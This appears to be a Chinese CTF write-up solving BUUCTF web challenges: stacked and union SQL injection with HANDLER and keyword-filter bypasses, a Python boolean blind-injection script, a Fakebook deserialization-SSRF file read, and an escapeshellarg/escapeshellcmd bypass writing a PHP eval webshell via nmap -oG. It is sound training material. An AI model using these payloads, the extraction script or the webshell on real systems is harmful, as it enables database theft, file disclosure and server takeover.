![image-20220312212801712](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212801712.png)

查看当前库下表名：

```
1';show tables;#
```

![image-20220312213008971](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213008971.png)

#### 利用handler直接读表内容

> **mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据**
>
> **不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中**

```
?inject=1';handler FlagHere open as a;handler a read first;handler a close;#
```

![image-20220312213440831](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213440831.png)





读表列名：flag表有一列

```
1';show columns from `FlagHere`;
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213600223.png" alt="image-20220312213600223" style="zoom:67%;" />

而另一张表：有两列

```
1';show columns from `words`;
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313100505291.png" alt="image-20220313100505291" style="zoom:50%;" />

#### 如果利用强网杯的思路：

> 1、将words表名替换成其他的
>
> 2、然后将 `FlagHere` 这个表名称替换成words
>
> 3、在把flag这个字段替换成data
>
> 4、最后再插入（新增）一个id字段
>
> 最终的查询结果就可以输出我们构造的新的words了

```
1';
alter table words rename to words1;
alter table `FlagHere` rename to words;
alter table words change flag id varchar(50);#

再利用万能密码爆出表数据
```

但是回显，发现过滤了很多：

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

那就只能用handler





#### 总结：

1.prepare的语句

```
PREPARE name from '[my sql sequece]';   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句，可以不用！

即：
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句（可以不用）
```

2.select被过滤的姿势

```
大小写绕过、<>、双写、%0a、%0d、/！**/

利用char函数，select——char(115,101,108,101,99,116)
1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#

可以拼接1';set @a=concat("sel","ect flag from 1919810931114514");prepare hello from @a;execute hello;# 

用handler代替，handler直接读表的一行数据
1';handler `1919810931114514` open as a;
handler a read first;
handler a close;#  //注意：这里有的题必须close handler才可以获取Flag

或利用十六进制编码绕过
set @a=concat("sel","ect flag from `1919810931114514`"); 
//或者将select * from ` 1919810931114514 `进行16进制编码
//@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460
prepare hello from @a；
execute hello;
```





## [CISCN2019 华北赛区 Day2 Web1]Hack World

#### 考点：盲注只回显true/flase、python脚本判断字符爆flag

思路：输入框测试发现回显bool(false)、无报错，对关键词敏感，但是发现输入4/2对应输出2的内容——说明有逻辑判断，尝试if语句，成功——写脚本爆出flag

> [参考WP](https://inanb.github.io/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/)

```
输入1回显Hello, glzjin wants a girlfriend.
输入2回显Do you want to be my girlfriend?
输入‘回显**bool(false)**
输入1 and 1=1 ,SQL Injection Checked.
输入'%23，SQL Injection Checked.
4/2——Do you want to be my girlfriend?
只有两个数据，输入3及以上就返回Error Occured When Fetch Result.
```

**但是好多字符包括空格都给过滤了**

但是：1/1、4/2是可以出结果的，也就是说，可以借助**逻辑判断**返回1和0，判断逻辑的真假。

> if类似三目运算
> if(条件,expr2,expr3)，如果条件为true,则返回expr2的值，否则返回3

布尔盲注：只返回true/false

空格被过滤：利用（）

```
id=if(length((select(flag)from(flag)))=42,1,0)
Hello, glzjin wants a girlfriend.
id=if(length((select(flag)from(flag)))=43,1,0)
Error Occured When Fetch Result.
```

说明flag长度是42

#### GUID

什么是 GUID？又叫uuid（通用标识符）

- 全球唯一标识符 (GUID) 是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID。

- GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF 即为有效的 GUID 值

- {CAF53C68-A94C-11D2-BB4A-00C04FA330A6}



 先写出一个核心的语句，判断flag的第一个字符是否ascii码为101

```
if((ascii(substr((select(flag)from(flag)),1,1))=101),1,2)
ASCII 101 :e
Do you want to be my girlfriend?  //说明不是e	
```

然后放到burp里爆出第一个字符是f，ASCII为102

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313112559474.png" alt="image-20220313112559474" style="zoom:67%;" />

```python
import requests
import time
url = 'http://9a1163f4-44f5-4def-9fca-a0c669acfeae.node4.buuoj.cn:81/index.php'
flag=""
for x in range(1,43):
    l = 32
    r = 126
    while r > l:
        mid = int((l+r+1) / 2)
        x = str(x)
        y = str(mid)
        id = {"id":'if(ascii(substr((select(flag)from(flag)),'+x+',1))>='+y+',1,0)'}  #python字符串拼接用+
        response = requests.post(url=url,data=id)
        if "Hello" in response.text:
            l = mid
        else:
            r = mid-1
        time.sleep(0.03)  #延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数）
    flag+=(chr(int(r)))
    print(chr(int(r)))
print(flag)
```





## [网鼎杯 2018]Fakebook

#### 考点：SQL注入、反序列化+curl_exec、SSRF

访问tobots.txt，得到备份文件

![image-20220313134519393](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313134519393.png)

访问/user.php.bak，下载备份文件，得到php代码

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);   //注意！SSRF
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

get方法中，**curl_exec()如果使用不当就会导致ssrf漏洞**。有一点思路了，而我们在御剑扫到了flag.php（我没扫到，猜测跟index.php在同一目录）。猜测可能flag.php处于内网，

如果用ssrf访问flag.php，可以==用伪协议file://var/www/html/flag.php访问。==



1. 随便注册一个用户abd,密码123，age11，blog:https://www.baidu.com，访问注册的用户，发现返回刚刚注册的内容，blog是输入的www.baidu.com

![image-20220313152014417](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152014417.png)

2. 然后下面的content查看源码，解码发现是www.baidu.com的首页内容==》**有思路了**，blog用file://读本地文件，下面的content回显base64的文件源码，利用ssrf伪协议读本地源码

![image-20220313152050715](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152050715.png)

3. 但是直接注册用户，blog那里有严格的preg过滤：**所以想在这个位置运用file协议不行**

4. 注册用户后，访问用户时发现url里有**参数no，尝试修改，发现注入点，但也有waf**

```
/view.php?no=1%20order%20by%205   //  [*] query error! (Unknown column '5' in 'order clause')——4列

/view.php?no=1%27union%20select%201,2,3,4%23  //no hack ~_~

/view.php?no=1^updatexml   //[*] query error! (Unknown column 'updatexml' in 'where clause')
/view.php?no=1^if(length((select(flag)from(information_schema.schemata)))=42,1,0)  //[*] query error! (Unknown column 'flag' in 'field list')   //information_schema.schemata 所有库名

/view.php?no=1^if(length((select(passwd)from(information_schema.tables)))=42,1,0)
//information_schema.tables：所有表集合，

1^if(length((select(passwd)from(users)))=128,0,1)，爆出password长度：128   //太麻烦了，卡壳，不知道咋读表、列名了
```

5. 查看WP发现unionselect被过滤，而且只对他俩中间得空格过滤——==中间加/**/即可绕过==

```
 ?no=-1 union/**/select 1,user(),3,4--+　　　　//数据库信息
root@localhost	  ==》root权限，可以sql读文件
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313144801377.png" alt="image-20220313144801377" style="zoom: 50%;" />

#### 法1：SQL注入root直接读本地文件

secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：

- 无内容，表示无限制。

- 为NULL，表示禁止文件读/写。

- 为目录名，表示仅允许对特定目录的文件进行读/写。

- 三种方法查看当前`secure-file-priv`的值：

  ```
  select @@secure_file_priv;
  select @@global.secure_file_priv;
  show variables like "secure_file_priv";
  ```

读文件：

- Mysql读取文件通常使用load_file函数，语法如下：【==限制：secure-file-priv无值（root）、绝对路径、文件必须在服务器上==】

- ```
  select load_file(file_path);
  ```

- ```
  load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件
  ```



```
-1 union/**/select 1,@@secure_file_priv,3,4--+    //回显空--说明无限制
/view.php?no=-1 union/**/select 1,load_file('/etc/passwd'),3,4--+   成功读到系统文件
```

![image-20220313145336505](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145336505.png)



payload：==注意！flag在源码==

```
view.php?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4--+
```

![image-20220313145628120](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145628120.png)



#### 法2：反序列化+SSRF读本地文件

继续注入，已知表是facebook

爆当前库下所有表名：

```
view.php?no=-1 union/**/select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3,4--+   错！，回显位置在中间时，from应该在select所有的后面
view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--+   //users表
```

爆users表列名：

```
view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'--+
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS	
```

爆字段：

```
view.php?no=-1 union/**/select 1,concat_ws('--',no,username,passwd,data),3,4 from users--+
```

![image-20220313150748223](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313150748223.png)

- 然后注意注入时一直都有的报错，大概意思是unserialize没有读取到参数

![image-20220313151150653](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151150653.png)

![image-20220313151308157](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151308157.png)

- 这个data就是序列化后的字符串，与一开始得到的源码有关联了，**因为页面提示了我们反序列化，所以猜测no参数的值代入数据库查询之后还会被反序列化一次，这个时候就会导致blog变异，读任意文件**

尝试把序列化字符传入不同位置，发现在4的位置成功读取序列化字符串，并反序列化返回www.baidu.com的base64内容

构造payload读取flag:

```
一开始：
O:8:"UserInfo":3:{s:4:"name";s:3:"abc";s:3:"age";i:11;s:4:"blog";s:21:"https://www.baidu.com";}
构造：
O:8:"UserInfo":3:{s:4:"name";s:3:"abc";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

成功读到base64，解码得到flag



## [BUUCTF 2018]Online Tool

考点：escapeshellarg()和escapeshellcmd()这个点，外加一个nmap的文件写入。

> [参考WP1](https://blog.csdn.net/qq_26406447/article/details/100711933)
>
> [参考WP2](https://blog.csdn.net/qq_52907838/article/details/119115412?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=1)

点进去得到源码

```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);  //对参数host过滤了
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

REMOTE_ADDR不能伪造，然后这里也不能产生影响

**escapeshellarg**本以为是自定义函数，但发现不是，是官方函数，防注入的，但可以绕过

> **应用使用**`escapeshellarg -> escapeshellcmd`**这样的流程来处理输入是存在隐患的**

```
127.0.0.1' -v -d a=1
经过escapeshellarg()函数处理后变为： '127.0.0.1'\'' -v -d a=1'
也就是将其中的'单引号转义，再将左右两部分用单引号括起来从而起到连接的作用，这样左右就形成闭合，命令就被当作简单的字符串。

接着经过escapeshellcmd()函数处理后变成：'172.17.0.2'\\'' -v -d a=1\'
也就是说对\以及最后那个不配对儿的引号进行了转义

执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
```



#### namp写webshell

其中参数<span style="background:#FF9999;">`-oG`可以实现将命令和结果写入文件，其格式为：内容 -oG 文件名称</span>

```
Nmap的一些参数：
-oN 标准保存
-oX XML保存
-oG Grep保存
-oA 保存到所有格式
-append-output 补充保存文件
```



构造

```
127.0.0.1 | <?php @eval($_POST[hack]);?> -oG shell.php
```

但这样会被escapeshellarg()与escapeshellcmd()函数处理为：

```
'127.0.0.1 | \<\?php @eval\(\)\;\?\> -oG hack.php'
```

